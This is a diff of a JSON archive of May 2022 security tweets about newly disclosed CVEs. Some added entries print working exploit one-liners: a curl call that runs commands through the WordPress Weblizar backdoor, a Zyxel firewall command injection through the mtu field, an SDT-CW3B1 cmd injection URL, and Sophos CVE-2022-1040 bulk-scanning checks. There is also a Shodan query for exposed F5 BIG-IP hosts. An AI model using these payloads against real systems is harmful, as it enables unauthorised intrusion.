@@ -97,20 +97,20 @@
     "username": "holisticinfosec"
 }
 {
-    "tweetfavorites": 597,
+    "tweetfavorites": 585,
     "tweetquotes": 10,
-    "tweetreplies": 2,
-    "tweetretweets": 238,
+    "tweetreplies": 3,
+    "tweetretweets": 231,
     "tweettext": "OK, now that I have access to a computer, let's take a look at this Office 0day that folks are talking about.\nIt's very similar to the MSHTML CVE-2021-40444 vul from September:\n1) Use of '!' at the end of the retrieved URI\n2) Size of retrieved HTML must be 4096 bytes or larger https://t.co/C2Bpuh7xHQ",
     "tweettime": "2022-05-30, 12:27:40",
     "tweeturl": "https://twitter.com/wdormann/status/1531250993127739392",
     "username": "wdormann"
 }
 {
-    "tweetfavorites": 74,
+    "tweetfavorites": 71,
     "tweetquotes": 2,
     "tweetreplies": 2,
-    "tweetretweets": 17,
+    "tweetretweets": 16,
     "tweettext": "My theory is that this \"ms-msdt\" bug was an ITW 0day at a point, following the disclosure of the \".docx loading IE engine\" vector in the CVE-2021-40444 0day (which was patched in Sep. PT). Microsoft knew the attack at some point and *silently patched* it in December or January.",
     "tweettime": "2022-05-30, 05:51:12",
     "tweeturl": "https://twitter.com/HaifeiLi/status/1531151217266569217",
@@ -128,6 +128,19 @@
     "tweettime": "2022-05-29, 17:40:22",
     "tweeturl": "https://twitter.com/Dinosn/status/1530967298777010178",
     "username": "Dinosn"
+}
+{
+    "expanded_url": [
+        "https://raw.githubusercontent.com/Pear1y/CVE-2022-0540-Preauth-RCE/main/exploit.yaml"
+    ],
+    "tweetfavorites": 187,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 66,
+    "tweettext": "Atlassian Jira Seraph Authentication Bypass RCE\nCVE-2022-0540\n\nhttps://t.co/AGCZEvbJ31\n\n#nday #bugbountytips #bugsbunny",
+    "tweettime": "2022-05-29, 09:44:56",
+    "tweeturl": "https://twitter.com/momika233/status/1530847649334980609",
+    "username": "momika233"
 }
 {
     "expanded_url": [
@@ -182,20 +195,20 @@
     "username": "CodeColorist"
 }
 {
-    "tweetfavorites": 836,
+    "tweetfavorites": 823,
     "tweetquotes": 5,
     "tweetreplies": 13,
-    "tweetretweets": 301,
+    "tweetretweets": 272,
     "tweettext": "CVE-2022-1609 WordPress Weblizar  Backdoor\n\n$ curl -s -d 'blowfish=1' -d \"blowf=system('id');\" 'http://localhost:8888/wp-json/am-member/license'\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n#bugbounty #bugbountytips #nday",
     "tweettime": "2022-05-26, 05:21:05",
     "tweeturl": "https://twitter.com/momika233/status/1529694086193508353",
     "username": "momika233"
 }
 {
-    "tweetfavorites": 458,
+    "tweetfavorites": 452,
     "tweetquotes": 4,
     "tweetreplies": 15,
-    "tweetretweets": 145,
+    "tweetretweets": 144,
     "tweettext": "SDT-CW3B1 1.1.0 - OS Command Injection CVE-2021-46422\n\npoc:hxxp://x.x.x.x/cgi-bin/admin.cgi?Command=sysCommand&amp;Cmd=id\n#0day #nday #CVE #bugbountytips #bugbounty https://t.co/PPJZZ1EStb",
     "tweettime": "2022-05-23, 14:18:58",
     "tweeturl": "https://twitter.com/momika233/status/1528742287072980992",
@@ -424,6 +437,16 @@
     "tweettime": "2022-05-13, 17:29:15",
     "tweeturl": "https://twitter.com/bad_packets/status/1525166293430677504",
     "username": "bad_packets"
+}
+{
+    "tweetfavorites": 706,
+    "tweetquotes": 8,
+    "tweetreplies": 11,
+    "tweetretweets": 179,
+    "tweettext": "curl -v --insecure -X POST -H \"Content-Type: application/json\" -d\n'{\"command\":\"setWanPortSt\",\"proto\":\"dhcp\",\"port\":\"4\",\"vlan_tagged\"\n:\"1\",\"vlanid\":\"5\",\"mtu\":\"; ping 192.168.1.220;\",\"data\":\"hi\"}'\nhttps://192.168.1.1/ztp/cgi-bin/handler\n\nCVE-2022-30525",
+    "tweettime": "2022-05-13, 12:52:54",
+    "tweeturl": "https://twitter.com/momika233/status/1525096747835719690",
+    "username": "momika233"
 }
 {
     "expanded_url": [
@@ -696,6 +719,26 @@
     "username": "cyb3rops"
 }
 {
+    "tweetfavorites": 162,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 51,
+    "tweettext": "CVE-2022-1040_checker\n\ncat sophos_servers | while read host do; do curl --connect-timeout 10 -ks -H \"X-Requested-With: XMLHttpRequest\" -X POST \"https://$host/userportal/Controller?mode=8700&amp;operation=1&amp;datagrid=179&amp;json=\\{\"👽\":\"TEST\"\\}\" | grep -q 'Session Expired'",
+    "tweettime": "2022-05-09, 15:22:19",
+    "tweeturl": "https://twitter.com/momika233/status/1523684797474045952",
+    "username": "momika233"
+}
+{
+    "tweetfavorites": 388,
+    "tweetquotes": 20,
+    "tweetreplies": 17,
+    "tweetretweets": 93,
+    "tweettext": "The CVE-2022-1388 vulnerability is surely an honest mistake by an F5 developer, right?\nRight??",
+    "tweettime": "2022-05-09, 12:16:45",
+    "tweeturl": "https://twitter.com/wdormann/status/1523638101796564993",
+    "username": "wdormann"
+}
+{
     "tweetfavorites": 589,
     "tweetquotes": 23,
     "tweetreplies": 6,
@@ -706,10 +749,10 @@
     "username": "jas502n"
 }
 {
-    "tweetfavorites": 469,
+    "tweetfavorites": 462,
     "tweetquotes": 4,
     "tweetreplies": 5,
-    "tweetretweets": 106,
+    "tweetretweets": 100,
     "tweettext": "POC, CVE-2022-1388  F5 Big-IP RCE\n#bugbounty #nday https://t.co/VLt2UjEWkf",
     "tweettime": "2022-05-09, 08:21:28",
     "tweeturl": "https://twitter.com/momika233/status/1523578889691607040",
@@ -749,6 +792,29 @@
     "username": "AnnaViolet20"
 }
 {
+    "tweetfavorites": 533,
+    "tweetquotes": 10,
+    "tweetreplies": 6,
+    "tweetretweets": 71,
+    "tweettext": "CVE-2022-1388 https://t.co/MjcM4Hy7ah",
+    "tweettime": "2022-05-09, 06:35:05",
+    "tweeturl": "https://twitter.com/chybeta/status/1523552115137810432",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://attackerkb.com/topics/cdXl2NL3cR/cve-2022-1040"
+    ],
+    "tweetfavorites": 143,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 42,
+    "tweettext": "CVE-2022-1040 single check\n\ncurl --connect-timeout 10 -ks -H \"X-Requested-With: XMLHttpRequest\" -X POST \"https://host/userportal/Controller?mode=8700&amp;operation=1&amp;datagrid=179&amp;json=\\{\"👽\":\"TEST\"\\}\"\n\nhttps://t.co/fzrXeVlgEf",
+    "tweettime": "2022-05-09, 05:52:18",
+    "tweeturl": "https://twitter.com/momika233/status/1523541351161540609",
+    "username": "momika233"
+}
+{
     "tweetfavorites": 0,
     "tweetquotes": 0,
     "tweetreplies": 0,
@@ -779,6 +845,16 @@
     "username": "Horizon3Attack"
 }
 {
+    "tweetfavorites": 498,
+    "tweetquotes": 1,
+    "tweetreplies": 5,
+    "tweetretweets": 132,
+    "tweettext": "CVE-2022-1040\n\ncurl --insecure -H \"X-Requested-With: XMLHttpRequest\" -X POST 'hxxps://x.x.x.x/userportal/Controller?mode=8700&amp;operation=1&amp;datagrid=179&amp;json=\\{\"🦞\":\"test\"\\}'\n\n👿",
+    "tweettime": "2022-05-06, 09:02:36",
+    "tweeturl": "https://twitter.com/momika233/status/1522502078140403712",
+    "username": "momika233"
+}
+{
     "expanded_url": [
         "http://dlvr.it/SPpwFz"
     ],
@@ -790,6 +866,16 @@
     "tweettime": "2022-05-05, 14:09:03",
     "tweeturl": "https://twitter.com/blueteamsec1/status/1522216808291258370",
     "username": "blueteamsec1"
+}
+{
+    "tweetfavorites": 332,
+    "tweetquotes": 2,
+    "tweetreplies": 11,
+    "tweetretweets": 106,
+    "tweettext": "BIG-IP iControl REST vulnerability CVE-2022-1388\nhxxp://ip/mgmt/shared/authn/login\nShodan:\nhttp.title:\"BIG-IP&amp;reg;-+Redirect\" +\"Server\"\n🫰",
+    "tweettime": "2022-05-05, 13:27:25",
+    "tweeturl": "https://twitter.com/momika233/status/1522206334099533826",
+    "username": "momika233"
 }
 {
     "expanded_url": [
@@ -829,4 +915,17 @@
     "tweettime": "2022-05-03, 11:03:24",
     "tweeturl": "https://twitter.com/_ForrestOrr/status/1521445312405065728",
     "username": "_ForrestOrr"
+}
+{
+    "expanded_url": [
+        "https://docs.google.com/document/d/1uZaoOTRNL9DweLNZPIX4Qz2PbwjJ5BkU-sDg2ojur7M/edit"
+    ],
+    "tweetfavorites": 477,
+    "tweetquotes": 13,
+    "tweetreplies": 14,
+    "tweetretweets": 169,
+    "tweettext": "Since the 7-zip CVE-2022-29072 dust has mostly settled, let's do a post mortem.\nThe vulnerability was a hoax. A nonsensical writeup with some jargon buzzwords and a video. How did various tech outlets fare? How resistant are we to disinformation?  🤔\nhttps://t.co/I7N4GxCyep",
+    "tweettime": "2022-05-02, 21:15:54",
+    "tweeturl": "https://twitter.com/wdormann/status/1521237068336316417",
+    "username": "wdormann"
 }
